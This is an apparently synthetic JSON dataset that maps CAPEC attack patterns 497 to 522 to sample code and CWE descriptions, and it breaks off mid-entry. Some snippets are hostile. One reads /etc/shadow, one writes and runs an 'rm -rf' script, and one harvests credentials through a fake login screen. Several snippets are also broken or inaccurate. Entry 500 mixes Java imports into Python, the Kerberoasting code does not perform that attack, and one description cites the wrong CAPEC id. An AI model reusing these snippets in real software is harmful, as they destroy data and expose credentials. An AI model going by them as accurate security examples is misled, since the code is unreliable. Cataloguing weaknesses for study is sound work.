    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import os\n\n# CWE-73: External Control of File Name or Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-426: Untrusted Search Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef find_sensitive_files(base_path, file_list):\n    sensitive_files = []\n    for file_name in file_list:\n        file_path = os.path.join(base_path, file_name)\n        if os.path.exists(file_path):\n            with open(file_path, 'r') as file:\n                content = file.read()\n                sensitive_files.append((file_path, content))\n    return sensitive_files\n\n# Example usage\nbase_path = '/etc/'  # CWE-426: Untrusted Search Path\nfile_list = ['passwd', 'shadow', 'config.txt']  # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_files = find_sensitive_files(base_path, file_list)\nfor file_path, content in sensitive_files:\n    print(f'Found sensitive file: {file_path}')\n    print(content)",
        "description": "This Python code snippet demonstrates a file discovery process that embodies the main idea of the CAPEC 'File Discovery'. The function `find_sensitive_files` takes a base directory path and a list of filenames to search for. It checks if each file exists in the specified directory and reads its content if found. The example usage searches for common sensitive files like 'passwd' and 'shadow' in the '/etc/' directory. This code is vulnerable to several CWEs: CWE-73 (External Control of File Name or Path) as it constructs file paths based on user input, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reads and prints sensitive file contents, CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere) as it may expose ACL files, CWE-426 (Untrusted Search Path) as it uses an externally-supplied search path, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) as it relies on file names to determine behavior."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import os\nimport shutil\n\n# Simulate sensitive information\nsensitive_info = 'User Password: 12345'\n\n# Save sensitive information to a temporary file\nwith open('temp_screenshot.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate app going to background and OS taking a screenshot\nos.system('screencapture temp_screenshot.png')\n\n# Simulate an adversary accessing the screenshot\nwith open('temp_screenshot.png', 'rb') as screenshot:\n    data = screenshot.read()\n    print('Adversary accessed screenshot data:', data)\n\n# Clean up temporary files\nos.remove('temp_screenshot.txt')\nos.remove('temp_screenshot.png')",
        "description": "This Python code snippet simulates the CAPEC 'Probe iOS Screenshots' attack. It demonstrates how sensitive information can be exposed when an application goes to the background and the OS takes a screenshot. The code first writes sensitive information to a temporary file, then simulates the OS taking a screenshot of this information. An adversary then accesses the screenshot file, demonstrating the exposure of sensitive information. Finally, the temporary files are cleaned up. This example highlights CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by showing how sensitive data can be accessed by unauthorized actors through OS-level screenshots."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n        Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}\n\n// CWE-926: Improper Export of Android Application Components\n// This component is exported without proper restrictions\n<receiver android:name=\".VulnerableReceiver\"\n    android:exported=\"true\">\n    <intent-filter>\n        <action android:name=\"com.example.SENSITIVE_ACTION\" />\n    </intent-filter>\n</receiver>",
        "description": "This code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly handles implicit intents, leading to potential intent interception. The BroadcastReceiver listens for an implicit intent with the action 'com.example.SENSITIVE_ACTION' and logs sensitive data received in the intent. The receiver is exported without proper restrictions, allowing any application to send intents to it. This embodies the CAPEC 'Android Intent Intercept' by showing how an adversary could intercept or manipulate intents due to improper verification (CWE-925), use of implicit intents for sensitive data (CWE-927), and improper export of application components (CWE-926)."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\nclass MyWebViewClient(WebViewClient):\n    def onPageFinished(self, view, url):\n        view.loadUrl(\"javascript:window.AndroidInterface.processHTML(document.getElementsByTagName('html')[0].innerHTML);\")\n\nclass MainActivity:\n    def __init__(self):\n        self.webview = WebView()\n        self.webview.getSettings().setJavaScriptEnabled(True)\n        self.webview.addJavascriptInterface(self.JavaScriptInterface(), \"AndroidInterface\")\n        self.webview.setWebViewClient(MyWebViewClient())\n        self.webview.loadUrl(\"http://example.com\")\n\n    class JavaScriptInterface:\n        @JavascriptInterface\n        def processHTML(self, html):\n            # Dangerous method: Exposing HTML content to the app\n            print(html)\n\nif __name__ == '__main__':\n    main_activity = MainActivity()",
        "description": "This Python code snippet represents a vulnerable Android application using WebView. The WebView component loads a web page and injects JavaScript into it, allowing the app to access the HTML content of the page. The JavaScriptInterface class exposes a method to process the HTML content, which is printed to the console. This setup embodies the 'WebView Injection' CAPEC by allowing an adversary to inject code into the web page context, manipulate the DOM, and potentially expose sensitive information. The code also demonstrates CWE-749 (Exposed Dangerous Method or Function) by exposing the HTML content to the app without proper restrictions, and CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the loaded URL."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to launch a trusted activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        // Prompt the user to enter sensitive data\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application where an implicit intent is used to launch a trusted activity. The MainActivity class sends an implicit intent to start a trusted activity. However, due to the use of an implicit intent, a malicious activity (MaliciousActivity) can intercept this intent and launch itself instead. The malicious activity mimics the trusted activity's user interface and prompts the user to enter sensitive data, exploiting the vulnerability described in the CAPEC. This example highlights the risks associated with CWE-927 (Use of Implicit Intent for Sensitive Communication) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        // CWE-926: Improper Export of Android Application Components\n        filter.addAction(\"com.example.TRUSTED_ACTION\");\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}",
        "description": "This Java code snippet represents a vulnerable Android BroadcastReceiver that improperly verifies intents and exports components without proper access control. The `VulnerableReceiver` class listens for intents with the action `com.example.TRUSTED_ACTION`. However, it does not verify the source of the intent, leading to potential exploitation by malicious applications (CWE-925). Additionally, the receiver is registered with a public action, making it accessible to any application that knows the action string (CWE-926). This can lead to unauthorized access to sensitive data, demonstrating the main idea of the CAPEC 'Intent Spoof' attack."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = (WebView) findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        webView.loadUrl(\"file:///android_asset/index.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses WebView and the addJavascriptInterface API. The WebView is configured to enable JavaScript and expose a Java object ('WebAppInterface') to JavaScript running in the WebView. The 'showToast' method in the 'WebAppInterface' class is annotated with @JavascriptInterface, making it accessible from JavaScript. This setup can be exploited by a malicious web page loaded in the WebView to call the 'showToast' method or any other exposed methods, leading to potential security risks such as improper access control (CWE-284) and exposed dangerous methods (CWE-749)."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n# CWE-285: Improper Authorization\n# CWE-506: Embedded Malicious Code\n\n# Malicious function to impersonate a user and perform unauthorized actions\nclass TaskImpersonation:\n    def __init__(self, user_token):\n        self.user_token = user_token\n\n    def impersonate_user(self):\n        # CWE-520: Using impersonation to gain elevated privileges\n        ctypes.windll.advapi32.ImpersonateLoggedOnUser(self.user_token)\n        print(\"User impersonated\")\n\n    def perform_task(self):\n        # CWE-285: Improper Authorization - No proper authorization check\n        if os.path.exists(\"/sensitive/data\"):  # CWE-506: Embedded Malicious Code\n            with open(\"/sensitive/data\", \"r\") as file:\n                data = file.read()\n                print(\"Sensitive data accessed:\", data)\n\n# Example usage\n# CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n# Simulating a malicious application impersonating a legitimate task\nmalicious_app = TaskImpersonation(user_token=1234)  # Example token\nmalicious_app.impersonate_user()\nmalicious_app.perform_task()",
        "description": "This Python code snippet demonstrates a malicious application that impersonates a user to perform unauthorized actions, embodying the concept of 'Task Impersonation' (CAPEC). The code uses ctypes to call Windows API functions for user impersonation (CWE-520, CWE-556). It then performs a task without proper authorization checks (CWE-285) and accesses sensitive data (CWE-506). The example usage simulates a malicious application impersonating a legitimate task, highlighting the risks of improper restriction of UI layers or frames (CWE-1021)."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import webbrowser\n\n# Malicious application registering a custom URL scheme\nclass MaliciousApp:\n    def __init__(self):\n        self.scheme = 'targetapp://'\n\n    def handle_url(self, url):\n        if url.startswith(self.scheme):\n            self.display_fake_screen()\n\n    def display_fake_screen(self):\n        # Mimic the target application screen\n        print('Welcome to TargetApp! Please enter your credentials.')\n        username = input('Username: ')\n        password = input('Password: ')\n        self.store_credentials(username, password)\n\n    def store_credentials(self, username, password):\n        # Store the stolen credentials\n        with open('stolen_credentials.txt', 'a') as f:\n            f.write(f'Username: {username}, Password: {password}\\n')\n\n# Simulate receiving a URL intended for the target application\nmalicious_app = MaliciousApp()\nmalicious_app.handle_url('targetapp://login')",
        "description": "This Python code snippet demonstrates a simplified version of a 'Scheme Squatting' attack. The malicious application registers a custom URL scheme ('targetapp://') intended for a target application that is not installed. When a URL with this scheme is received, the malicious application displays a fake login screen mimicking the target application, prompting the user to enter their credentials. The entered credentials are then stored in a file, simulating the theft of sensitive information. This code embodies the main idea of CAPEC- Scheme Squatting and incorporates CWE-939 (Improper Authorization in Handler for Custom URL Scheme) by not properly restricting which actors can invoke the handler using the scheme."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\n\nclass MaliciousApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.geometry('300x200')\n        self.root.title('Innocent App')\n\n        # Transparent overlay button\n        self.overlay_button = tk.Button(self.root, text='', command=self.malicious_action)\n        self.overlay_button.place(x=50, y=50, width=200, height=100)\n        self.overlay_button.lift()  # Bring the button to the front\n\n        # Innocent looking button\n        self.innocent_button = tk.Button(self.root, text='Click Me!', command=self.innocent_action)\n        self.innocent_button.place(x=50, y=50, width=200, height=100)\n\n    def malicious_action(self):\n        print('Malicious action executed!')\n\n    def innocent_action(self):\n        print('Innocent action executed!')\n\nif __name__ == '__main__':\n    root = tk.Tk()\n    app = MaliciousApp(root)\n    root.mainloop()",
        "description": "This Python code snippet demonstrates a simple example of a tapjacking attack using the Tkinter library. The code creates a GUI application with two buttons: an innocent-looking button and a transparent overlay button placed on top of it. When the user clicks on the visible 'Click Me!' button, they are actually clicking on the transparent overlay button, which triggers a malicious action. This represents the main idea of the CAPEC by misleading the user into interacting with a malicious interface. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the overlay button to capture clicks intended for the underlying button."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import os\n\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\n# CWE-1263: Improper Physical Access Control\n\n# Sensitive information\nsensitive_data = 'SuperSecretPassword123'\n\n# Store sensitive information in a file without proper access control\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Exposing system information\nsystem_info = os.uname()\nprint(f'System Info: {system_info}')\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# Simulating a side-channel vulnerability\nimport time\nstart_time = time.time()\n# Perform some sensitive operation\nfor _ in range(1000000):\n    pass\nend_time = time.time()\nprint(f'Operation Time: {end_time - start_time} seconds')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to physical theft and improper protection of sensitive information. It stores sensitive data in a file without proper access control (CWE-922, CWE-921), which can be easily accessed if an adversary gains physical access to the system. It also exposes system information (CWE-497) that could be useful for an attacker. Additionally, it simulates a side-channel vulnerability by measuring the time taken to perform a sensitive operation (CWE-1300), which could be exploited by an attacker with physical access to the device. The code embodies the main idea of the CAPEC by highlighting how physical access can lead to various security breaches."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import getpass\n\n# Simulate a login process where sensitive information is exposed\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# Simulate a shoulder surfing vulnerability by printing sensitive information\nprint(f'Username: {username}')\nprint(f'Password: {password}')  # This should not be printed in a real application\n\n# Simulate cleartext transmission of sensitive information\ndef transmit_credentials(user, pwd):\n    # Insecure transmission of credentials\n    print(f'Transmitting credentials: {user}:{pwd}')\n\ntransmit_credentials(username, password)",
        "description": "This Python code snippet demonstrates a shoulder surfing vulnerability by exposing sensitive information such as username and password. The `getpass` module is used to securely input the password, but the code then prints the sensitive information, simulating a scenario where an unauthorized actor could observe it. Additionally, the code simulates the cleartext transmission of sensitive information, which can be intercepted by unauthorized actors. This example embodies the main idea of the CAPEC by showing how sensitive information can be exposed to unauthorized actors through improper handling and transmission."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import subprocess\nimport os\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\n# Function to request a Kerberos ticket for a service account\n# This is a simplified example and should not be used in production\n\ndef request_kerberos_ticket(service_account):\n    # Requesting a Kerberos ticket using a single-factor authentication\n    command = f'kinit {service_account}'\n    subprocess.run(command, shell=True)\n\n# Function to extract and save the Kerberos ticket to disk\n# This is a simplified example and should not be used in production\n\ndef extract_and_save_ticket():\n    # Extracting the ticket from the local cache\n    ticket_cache = '/tmp/krb5cc_0'\n    if os.path.exists(ticket_cache):\n        with open(ticket_cache, 'rb') as f:\n            ticket_data = f.read()\n        # Saving the ticket to disk\n        with open('service_ticket.kirbi', 'wb') as f:\n            f.write(ticket_data)\n\n# Function to simulate brute-forcing the hashed credentials\n# This is a simplified example and should not be used in production\n\ndef brute_force_ticket(ticket_file):\n    # Simulating brute force attack on the ticket\n    with open(ticket_file, 'rb') as f:\n        ticket_data = f.read()\n    # This is just a placeholder for the actual brute force logic\n    print('Brute-forcing the ticket...')\n\n# Main function to demonstrate the Kerberoasting attack\n\ndef main():\n    service_account = 'service_account@domain.com'\n    request_kerberos_ticket(service_account)\n    extract_and_save_ticket()\n    brute_force_ticket('service_ticket.kirbi')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simplified version of a Kerberoasting attack. The code requests a Kerberos ticket for a service account using single-factor authentication (CWE-308, CWE-309), extracts the ticket from the local cache (CWE-522), and saves it to disk. It then simulates a brute-force attack on the saved ticket to crack the hashed credentials. This example highlights vulnerabilities such as insufficiently protected credentials, weak password requirements, and the use of single-factor authentication, which are related to the described CAPEC and CWEs."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\n# Malicious application leveraging a trusted user's session\nclass MaliciousApp:\n    def __init__(self, session_token):\n        self.session_token = session_token\n        self.saas_url = 'https://example-saas.com/api/'\n\n    def perform_malicious_action(self):\n        headers = {\n            'Authorization': f'Bearer {self.session_token}'\n        }\n        # Exploiting the trusted session to perform unauthorized actions\n        response = requests.post(self.saas_url + 'delete_account', headers=headers, json={'user_id': 'victim_user_id'})\n        if response.status_code == 200:\n            print('Malicious action performed successfully')\n        else:\n            print('Failed to perform malicious action')\n\n# Example usage\n# Assume the session_token is obtained through some means (e.g., phishing, malware)\nsession_token = 'trusted_user_session_token'\nmalicious_app = MaliciousApp(session_token)\nmalicious_app.perform_malicious_action()",
        "description": "This Python code snippet demonstrates a 'SaaS User Request Forgery' attack. The `MaliciousApp` class represents a malicious application that leverages a trusted user's session token to perform unauthorized actions on a SaaS application. The `perform_malicious_action` method sends a POST request to delete a user account, exploiting the implicit trust placed on the authenticated session. This attack is facilitated by weaknesses such as 'Origin Validation Error' (CWE-346) and 'Incorrect Authorization' (CWE-863), as the SaaS application does not properly verify the source of the request or correctly perform authorization checks."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport shutil\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\nDEBUG = True\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_data = 'SECRET_API_KEY'\n\nif DEBUG:\n    print(f'Debugging mode: Sensitive data is {sensitive_data}')\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\nuploaded_file_path = '/tmp/malicious_script.py'\n\n# Simulate the upload of a dangerous file\nwith open(uploaded_file_path, 'w') as f:\n    f.write('import os\\nos.system(\"rm -rf /important_data\")')\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Malicious code that exfiltrates sensitive data\ndef exfiltrate_data():\n    with open('/etc/passwd', 'r') as f:\n        data = f.read()\n    # Simulate sending data to an attacker\n    print(f'Exfiltrating data: {data}')\n\n# Execute the malicious script\nos.system(f'python3 {uploaded_file_path}')\n\n# Call the exfiltration function\nexfiltrate_data()",
        "description": "This Python code snippet demonstrates a scenario where an attacker infiltrates a software development environment, leveraging multiple vulnerabilities to achieve their goals. The code includes:\n\n1. **CWE-215**: Sensitive information (e.g., an API key) is inserted into debugging code, which is printed when debugging is enabled.\n2. **CWE-200**: Sensitive information is exposed to unauthorized actors through the debugging print statement.\n3. **CWE-434**: A dangerous file (malicious script) is uploaded and written to the file system without restriction.\n4. **CWE-506**: The uploaded file contains embedded malicious code that deletes important data.\n5. **CWE-497**: The exfiltration function reads sensitive system information (e.g., `/etc/passwd`) and simulates sending it to an attacker.\n\nThe code represents the main idea of CAPEC-117: 'Infiltration of Software Development Environment,' where an attacker gains access to the IDE, implants malware, and exfiltrates/manipulates sensitive data, potentially compromising the supply chain."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import third_party_component\n\nclass Device:\n    def __init__(self):\n        # Dependency on a third-party component that may be vulnerable\n        self.component = third_party_component.Component()\n        \n    def calibrate(self):\n        # Simulate calibration process\n        if not self.component.is_trustworthy():\n            raise Exception(\"Component is not trustworthy\")\n        self.component.calibrate()\n        \n    def deploy(self):\n        # Deploy the device with the potentially malicious component\n        if not self.component.is_updateable():\n            raise Exception(\"Component cannot be updated\")\n        print(\"Device deployed with component version:\", self.component.version)\n\n# Simulate the baselining process\ntry:\n    device = Device()\n    device.calibrate()\n    device.deploy()\nexcept Exception as e:\n    print(\"Error during device setup:\", e)",
        "description": "This Python code snippet simulates a scenario where a device depends on a third-party component during its baselining process. The `Device` class initializes with a third-party component, which may be vulnerable (CWE-1395). During the calibration phase, the code checks if the component is trustworthy (CWE-1357). If the component is not trustworthy, an exception is raised. During deployment, the code checks if the component can be updated (CWE-1329). If the component cannot be updated, an exception is raised. This represents the CAPEC scenario where an adversary could substitute a malicious component during the baselining process, leading to a compromised final product."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import os\n\n# CWE-1263: Improper Physical Access Control\n# Simulating access to sensitive documentation\nsensitive_docs_path = '/path/to/sensitive/docs'\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\ntry:\n    with open(sensitive_docs_path, 'r') as file:\n        sensitive_data = file.read()\nexcept FileNotFoundError:\n    print('Sensitive documentation not found.')\n    sensitive_data = ''\n\n# CWE-1059: Insufficient Technical Documentation\n# CWE-695: Use of Low-Level Functionality\n# Simulating alteration of documentation to circumvent dial-down functionality\nif sensitive_data:\n    altered_data = sensitive_data.replace('restricted_technology', 'allowed_technology')\n    with open(sensitive_docs_path, 'w') as file:\n        file.write(altered_data)\n    print('Documentation altered to circumvent restrictions.')\nelse:\n    print('No sensitive data to alter.')\n\n# CWE-222: Truncation of Security-relevant Information\n# Simulating truncation of logs to obscure the alteration\nlog_path = '/path/to/logs'\ntry:\n    with open(log_path, 'a') as log_file:\n        log_file.write('Documentation altered.\\n')\nexcept Exception as e:\n    print(f'Failed to write to log: {e}')",
        "description": "This Python code snippet simulates the main idea of the CAPEC 'Documentation Alteration to Circumvent Dial-down'. It demonstrates how an attacker with physical access to sensitive documentation (CWE-1263) can read and alter the documentation to replace restricted technology with allowed technology (CWE-200, CWE-1059, CWE-695). The code also simulates the truncation of security-relevant information by appending a log entry that could obscure the nature of the attack (CWE-222). The code highlights the vulnerabilities associated with improper access control, exposure of sensitive information, insufficient documentation, use of low-level functionality, and truncation of security-relevant information."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "class SystemDocumentation:\n    def __init__(self, system_capabilities):\n        self.system_capabilities = system_capabilities\n        self.documentation = {}\n\n    def add_documentation(self, component, description):\n        self.documentation[component] = description\n\n    def alter_documentation(self, component, new_description):\n        if component in self.documentation:\n            self.documentation[component] = new_description\n        else:\n            raise ValueError('Component not found in documentation')\n\n    def get_documentation(self, component):\n        return self.documentation.get(component, 'No documentation available')\n\n# Example usage\nsystem_doc = SystemDocumentation(system_capabilities=['auth', 'db', 'network'])\nsystem_doc.add_documentation('auth', 'Handles user authentication securely')\nsystem_doc.add_documentation('db', 'Manages database connections and queries')\nsystem_doc.add_documentation('network', 'Ensures secure network communication')\n\n# Attacker alters the documentation to introduce a flaw\nsystem_doc.alter_documentation('auth', 'Handles user authentication with basic security')\n\n# Fetching the altered documentation\nprint(system_doc.get_documentation('auth'))",
        "description": "This Python code snippet represents a simplified model of how an attacker could alter system documentation to introduce flaws, as described in the CAPEC. The `SystemDocumentation` class manages documentation for various system components. The `alter_documentation` method allows for the modification of existing documentation, which an attacker could exploit to introduce misleading or incorrect information. This could lead to the implementation of under-performing or insecure systems. The example usage demonstrates how an attacker might change the description of the 'auth' component to weaken its security, embodying the idea of 'Documentation Alteration to Produce Under-performing Systems'. The related CWEs are represented by the lack of sufficient and accurate documentation, exposure of sensitive information, and improper following of specifications."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemComponent:\n    def __init__(self, config):\n        # Missing documentation for design\n        self.config = config\n        self.state = None\n\n    def initialize(self):\n        # Insufficient technical documentation\n        self.state = 'initialized'\n\n    def execute(self, command):\n        # Incorrect provision of specified functionality\n        if command == 'start':\n            self.state = 'running'\n        elif command == 'stop':\n            self.state = 'stopped'\n        else:\n            # Improper following of specification by caller\n            raise ValueError('Unknown command')\n\n    def dynamic_resource_access(self, resource_name, value=None):\n        # Improper control of dynamically-managed code resources\n        if value is not None:\n            setattr(self, resource_name, value)\n        return getattr(self, resource_name, None)\n\n# Example usage\ncomponent = SystemComponent(config={})\ncomponent.initialize()\ncomponent.execute('start')\nprint(component.dynamic_resource_access('state'))\ncomponent.dynamic_resource_access('state', 'compromised')\nprint(component.dynamic_resource_access('state'))",
        "description": "This Python code snippet represents a simplified system component that suffers from several vulnerabilities related to insufficient and missing documentation, incorrect functionality, and improper control of dynamically-managed code resources. The `SystemComponent` class lacks proper documentation for its design and technical details. The `execute` method does not follow specifications correctly, potentially leading to incorrect usage. The `dynamic_resource_access` method allows unrestricted reading and writing to dynamically-managed code resources, which can be exploited by an attacker to alter the system's state maliciously. This embodies the main idea of the CAPEC, where an attacker could alter documentation to introduce such vulnerabilities, leading to errors in system design and potential exploitation."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import hashlib\n\nclass TrustedComponent:\n    def __init__(self, data):\n        self.data = data\n\n    def process(self):\n        return hashlib.sha256(self.data.encode()).hexdigest()\n\nclass CounterfeitComponent(TrustedComponent):\n    def process(self):\n        # Malicious behavior: return a fixed hash value\n        return 'malicious_hash_value'\n\n# Simulate product assembly\ncomponents = [TrustedComponent('safe_data'), CounterfeitComponent('malicious_data')]\n\nfor component in components:\n    print(f'Component processed data: {component.process()}')",
        "description": "This Python code snippet demonstrates the concept of 'Counterfeit Hardware Component Inserted During Product Assembly' by simulating the inclusion of a counterfeit component in a product assembly process. The `TrustedComponent` class represents a legitimate component that processes data securely by hashing it. The `CounterfeitComponent` class inherits from `TrustedComponent` but overrides the `process` method to exhibit malicious behavior, returning a fixed hash value instead of processing the data correctly. This represents the CWE-506 (Embedded Malicious Code) and CWE-1357 (Reliance on Insufficiently Trustworthy Component). The assembly process includes both trusted and counterfeit components, highlighting the risk of introducing malicious components during product assembly."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, register_defaults=None):\n        # CWE-1221: Incorrect Register Defaults or Module Parameters\n        self.register_defaults = register_defaults if register_defaults else {'reg1': 0x00, 'reg2': 0x00}\n        self.lock_bit = False  # CWE-1231: Improper Prevention of Lock Bit Modification\n\n    def set_register(self, reg, value):\n        if not self.lock_bit:\n            self.register_defaults[reg] = value\n        else:\n            print('Modification not allowed, lock bit is set.')\n\n    def set_lock_bit(self):\n        self.lock_bit = True\n\n    def modify_lock_bit(self, value):\n        # CWE-1231: Improper Prevention of Lock Bit Modification\n        self.lock_bit = value\n\n# CWE-1059: Insufficient Technical Documentation\n# The following code lacks sufficient documentation for its usage and structure.\n\n# CWE-657: Violation of Secure Design Principles\n# The design allows modification of lock bit after it has been set, violating secure design principles.\n\n# CWE-1296: Incorrect Chaining or Granularity of Debug Components\n# This example does not include debug components, but in a real scenario, improper chaining could be an issue.\n\n# Example usage\ncomponent = HardwareComponent()\ncomponent.set_register('reg1', 0xFF)\ncomponent.set_lock_bit()\ncomponent.modify_lock_bit(False)  # Vulnerability: lock bit can be modified after being set\ncomponent.set_register('reg1', 0xAA)  # This should not be allowed if lock bit was properly secured",
        "description": "This Python code snippet represents a simplified model of a hardware component with register defaults and a lock bit mechanism. The main idea of the CAPEC is embodied by allowing an attacker to alter the design specifications, which introduces flaws advantageous to the attacker. The code includes several CWE-related vulnerabilities: CWE-1221 (Incorrect Register Defaults or Module Parameters) is represented by the insecure default values of the registers. CWE-1231 (Improper Prevention of Lock Bit Modification) is shown by the ability to modify the lock bit after it has been set. CWE-1059 (Insufficient Technical Documentation) is indicated by the lack of detailed documentation for the class and its methods. CWE-657 (Violation of Secure Design Principles) is demonstrated by the insecure design that allows the lock bit to be modified. CWE-1296 (Incorrect Chaining or Granularity of Debug Components) is mentioned as a potential issue in a more complex scenario. The code snippet highlights how these vulnerabilities can be exploited, such as modifying the lock bit to change register values even after the lock bit is set."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
